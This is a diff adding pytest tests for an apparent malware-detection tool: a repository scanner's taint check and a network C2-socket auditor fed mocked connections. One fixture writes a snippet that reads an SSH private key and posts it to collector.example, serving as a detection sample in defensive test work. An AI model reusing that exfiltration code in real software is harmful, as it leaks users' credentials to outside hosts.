@@ -222,3 +222,84 @@ def test_daemon_quarantines_ioc_hash_match(tmp_path):
     q_items = store.list_quarantine_items(status="QUARANTINED")
     assert len(q_items) == 1
     assert "Renamed_Stealer" in q_items[0]["reason"]
+
+
+def test_ast_taint_exfiltration_and_clean_split(tmp_path):
+    from agent import repo_scanner
+
+    evil_dir = tmp_path / "evil_taint"
+    evil_dir.mkdir()
+    (evil_dir / "exfil.py").write_text(
+        'import requests\n'
+        'with open("/home/user/.ssh/id_rsa", "r") as fh:\n'
+        '    secret_blob = fh.read()\n'
+        'payload = secret_blob\n'
+        'requests.post("https://collector.example/upload", data={"k": payload})\n',
+        encoding="utf-8",
+    )
+    report = repo_scanner.scan_repository(str(evil_dir), quiet=True)
+    threats = {f["threat"] for f in report["findings"]}
+    assert "AST Taint Flow: Sensitive Data Exfiltration to Network" in threats
+
+    clean_dir = tmp_path / "clean_split"
+    clean_dir.mkdir()
+    (clean_dir / "metrics.py").write_text(
+        'import requests\n'
+        'with open("version.txt", "r") as fh:\n'
+        '    ver = fh.read()\n'
+        'requests.post("https://metrics.example/ping", data={"v": ver})\n',
+        encoding="utf-8",
+    )
+    clean_report = repo_scanner.scan_repository(str(clean_dir), quiet=True)
+    clean_threats = {f["threat"] for f in clean_report["findings"]}
+    assert "AST Taint Flow: Sensitive Data Exfiltration to Network" not in clean_threats
+
+
+def test_network_c2_socket_auditor(tmp_path, monkeypatch):
+    from types import SimpleNamespace
+    import psutil
+
+    store = CogniGuardStore(str(tmp_path / "c2.db"))
+    fake_conns = [
+        SimpleNamespace(
+            raddr=SimpleNamespace(ip="198.51.100.77", port=4444),
+            status="ESTABLISHED",
+            pid=4040,
+        ),
+        SimpleNamespace(
+            raddr=SimpleNamespace(ip="203.0.113.9", port=443),
+            status="ESTABLISHED",
+            pid=5050,
+        ),
+        SimpleNamespace(
+            raddr=SimpleNamespace(ip="93.184.216.34", port=443),
+            status="ESTABLISHED",
+            pid=6060,
+        ),
+    ]
+
+    class FakeProcess:
+        def __init__(self, pid):
+            self._pid = pid
+
+        def name(self):
+            return {4040: "beacon.exe", 5050: "dropper.exe", 6060: "python.exe"}[self._pid]
+
+        def exe(self):
+            return {
+                4040: "C:\\Program Files\\App\\beacon.exe",
+                5050: "C:\\Users\\user\\AppData\\Local\\Temp\\dropper.exe",
+                6060: "C:\\Python313\\python.exe",
+            }[self._pid]
+
+    monkeypatch.setattr(psutil, "net_connections", lambda kind="inet": fake_conns)
+    monkeypatch.setattr(psutil, "Process", FakeProcess)
+
+    audit = CogniGuardAgent().audit_network_connections(store=store)
+    assert audit["status"] == "C2_DETECTED"
+    assert audit["connections_inspected"] == 3
+    assert audit["flagged_count"] == 2
+    flagged_ports = {item["remote_port"] for item in audit["flagged"]}
+    assert flagged_ports == {4444, 443}
+    logs = store.list_audit_logs(limit=10)
+    assert any(row["action_taken"] == "FLAGGED_C2_SOCKET" for row in logs)
